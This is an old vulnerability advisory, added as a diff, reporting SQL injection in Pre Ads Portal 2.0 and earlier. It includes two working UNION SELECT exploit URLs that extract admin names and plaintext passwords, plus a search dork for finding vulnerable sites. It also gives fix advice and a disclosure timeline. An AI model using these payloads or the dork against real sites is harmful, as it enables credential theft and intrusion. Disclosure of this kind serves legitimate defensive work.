@@ -1,0 +1,88 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \  
+ |    __)_ /    \  \//    ~    \/   |   \ 
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/ 
+
+                                        .OR.ID
+ECHO_ADV_98$2008
+
+-----------------------------------------------------------------------------------------
+[ECHO_ADV_98$2008] Pre Ads Portal <= 2.0 Sql Injection Vulnerability
+-----------------------------------------------------------------------------------------
+
+Author         : M.Hasran Addahroni
+Date           : June, 13 th 2008
+Location       : Jakarta, Indonesia
+Web            : http://e-rdc.org/v1/news.php?readmore=98
+Critical Lvl   : Medium
+Impact	       : System access
+Where	       : From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application   : Pre Ads Portal
+version       : <= 2.0
+Vendor        : http://www.preproject.com/ads.asp
+Description   :
+
+Pre ADS Portal is a Web Application which is used to submit your personal listings into different categories. You can add your's Listings into the following categories or can also add, edit and delete categories and sub categories from admin section. Pre ADS Portal fully customizable website for ads submission solution with golden and featured listings features.  During submission users can make their ads golden or featured listed and webmaster can add packages for monthly payments against these features. 2Checkout and PAYPAL have been integrated to this portal system. We have tried to make script completely resembles to Businessesforsale.com, hotscripts.com and mostly advanced classifieds websites. Blows are the main features or a kind of manual of our Pre ADS Portal. 
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~~
+
+Input passed to the "cid" parameter in showcategory.php page and "id" parameter in software-description.php are not properly verified before being used to sql query. 
+This can be exploited thru the browser and get password from admin in plain text.
+Successful exploitation requires that "magic_quotes" is off.
+
+
+Poc/Exploit:
+~~~~~~~~~
+
+http://www.target.com/[path]/showcategory.php?cid=-1%20union%20select%201,concat(id,0x3a,admin_name,0x3a,pwd),3,4,5,6%20from%20sbwmd_admin--
+http://www.target.com/[path]/software-description.php?id=-1%20union%20select%201,2,concat(id,0x3a,admin_name,0x3a,pwd),4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1%20from%20sbwmd_admin--
+
+Dork:
+~~~~
+altavista : "home | login | register | feedback | link to us | submit Listing | advertise"
+
+
+Solution:
+~~~~~~
+
+- Edit the source code to ensure that input is properly verified.
+- Turn on magic_quotes in php.ini
+ 
+
+Timeline:
+~~~~~~~~
+
+- 10 - 06 - 2008 bug found
+- 13 - 06 - 2008 vendor contacted
+- 13 - 06 - 2008 advisory released
+---------------------------------------------------------------------------
+
+Shoutz:
+~~~~
+~ ping - my dearest wife, zautha my little warrior "happy birthday, dear"
+~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,pushm0v,az01,negative,the_hydra,neng chika, str0ke
+~ everybody [at] SCAN-NUSANTARA and SCAN-ASSOSIATES
+~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,sakitjiwa,x16,an0maly,cybertank,super_temon,b120t0,inggar,fachri,adi,rahmat,indra,cyb3rh3b
+~ dr188le,SinChan,h4ntu,cow_1seng,poniman_coy,paman_gembul,ketut,rizal,cR4SH3R,kuntua,stev_manado,nofry,k1tk4t,0pt1c
+~ newbie_hacker@yahoogroups.com
+~ #aikmel #e-c-h-o @irc.dal.net
+
+---------------------------------------------------------------------------
+Contact:
+~~~~~
+
+     K-159 || echo|staff || eufrato[at]gmail[dot]com
+     Homepage: http://www.e-rdc.org/
+
+-------------------------------- [ EOF ] ----------------------------------
+
+# milw0rm.com [2008-06-13]
